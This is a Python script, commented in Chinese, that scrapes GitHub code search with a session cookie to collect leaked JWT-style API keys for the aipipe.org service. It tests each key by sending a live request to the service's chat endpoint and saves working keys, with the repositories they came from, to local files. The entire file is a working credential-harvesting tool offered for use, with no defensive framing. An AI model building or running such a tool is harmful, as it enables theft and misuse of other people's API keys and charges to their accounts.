#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AiPipe API 密钥扫描器
基于 GitHub Session Search，支持高并发扫描
目标: aipipe.org
"""

import os
import re
import time
import threading
import concurrent.futures
from queue import Queue
import requests
from datetime import datetime
import random

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# AiPipe 配置
AIPIPE_BASE_URL = "https://aipipe.org/openrouter/v1/chat/completions"
TEST_MODEL = "google/gemini-2.5-flash"

# 并发配置
MAX_WORKERS = 10
API_DELAY = 1.0

# 存储结果
live_keys_queue = Queue()
processed_keys = set()
lock = threading.Lock()
file_lock = threading.Lock()

# 实时保存文件名
live_keys_filename = None
simple_keys_filename = None

# --- AiPipe API 验证 ---

def check_aipipe_key(key):
    """验证 AiPipe API 密钥"""
    # 简单的格式预检查 (JWT格式: eyJ...)
    if not key.startswith("eyJ"):
        return {"status": "无效格式", "type": "invalid"}
        
    try:
        headers = {
            "Authorization": f"Bearer {key}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "model": TEST_MODEL,
            "messages": [
                {"role": "user", "content": "Hi"}
            ],
            "max_tokens": 1
        }
        
        # AiPipe 似乎是 OpenRouter 兼容接口
        response = requests.post(AIPIPE_BASE_URL, headers=headers, json=payload, timeout=15)
        
        if response.status_code == 200:
            return {
                "status": f"🟢 存活 (Live) - {TEST_MODEL}", 
                "type": "live",
                "response": response.json()
            }
        elif response.status_code == 401:
            return {"status": "🔴 无效/已吊销 (401)", "type": "invalid"}
        elif response.status_code == 402:
            return {"status": "🟡 余额不足 (402)", "type": "live_no_quota"}
        else:
            return {"status": f"⚪ 未知状态: {response.status_code}", "type": "unknown"}
            
    except Exception as e:
        return {"status": f"⚪ 异常: {str(e)}", "type": "error"}

# --- 核心功能 (参考 aliyun_scanner.py) ---

def save_live_key_immediately(key_info):
    """实时保存"""
    global live_keys_filename, simple_keys_filename
    
    with file_lock:
        if live_keys_filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            live_keys_filename = f'aipipe_live_keys_{timestamp}.txt'
            simple_keys_filename = f'aipipe_keys_simple_{timestamp}.txt'
            
            with open(live_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== AiPipe API 密钥扫描结果 ===\n")
                f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
                
        with open(live_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔑 {key_info['key'][:20]}...\n")
            f.write(f"   完整密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   来源: {key_info['url']}\n")
            f.write("-" * 60 + "\n")
            
        with open(simple_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"{key_info['key']}\n")
            
        print(f"💾 已保存: {key_info['key'][:15]}...")

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def process_content_file(file_url, worker_id):
    """处理文件内容"""
    try:
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return
            
        content = resp.text
        
        # 提取 JWT 格式密钥
        # 匹配: eyJ... . ... . ...
        pattern = r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
        keys = re.findall(pattern, content)
        
        for key in keys:
            # 简单过滤：长度太短肯定不是有效JWT
            if len(key) < 50:
                continue
                
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
                
            print(f"[Worker-{worker_id}] 🔍 验证: {key[:15]}...")
            result = check_aipipe_key(key)
            print(f"[Worker-{worker_id}] 结果: {result['status']}")
            
            if result['type'] in ["live", "live_no_quota"]:
                info = {
                    'key': key,
                    'status': result['status'],
                    'url': file_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                save_live_key_immediately(info)
                live_keys_queue.put(info)
                
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 异常: {e}")

def main():
    if not GITHUB_SESSION:
        print("❌ 错误: 请设置 GITHUB_SESSION")
        return

    print("🚀 开始 AiPipe 密钥扫描")
    
    # 搜索查询
    queries = [
        # 用户指定的正则语法
        r'/[A-Za-z0-9_-]{20,100}\.[A-Za-z0-9_-]{20,100}\.[A-Za-z0-9_-]{20,100}/ aipipe',
        r'/eyJ[A-Za-z0-9_-]+.[A-Za-z0-9_-]+.[A-Za-z0-9_-]+/ aipipe',
        'aipipe eyJhbGci'
    ]
    
    all_links = set()
    
    # 1. 搜索
    for q in queries:
        print(f"📡 搜索: {q}")
        for page in range(1, 6):
            try:
                url = "https://github.com/search"
                params = {'q': q, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
                resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
                
                if resp.status_code == 429:
                    print("⚠️ Rate Limit. Sleep 60s...")
                    time.sleep(60)
                    continue
                    
                links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
                if not links: break
                
                new_cnt = 0
                for link in links:
                    full = "https://github.com" + link.split('#')[0]
                    if full not in all_links:
                        all_links.add(full)
                        new_cnt += 1
                
                print(f"   Page {page}: +{new_cnt} links")
                time.sleep(random.uniform(2, 5))
            except Exception as e:
                print(f"Error: {e}")
                break
                
    print(f"✅ 共收集 {len(all_links)} 个文件，开始并发处理...")
    
    # 2. 并发处理
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_content_file, url, i % MAX_WORKERS) for i, url in enumerate(all_links)]
        concurrent.futures.wait(futures)
        
    print("🏁 完成")

if __name__ == "__main__":
    main()
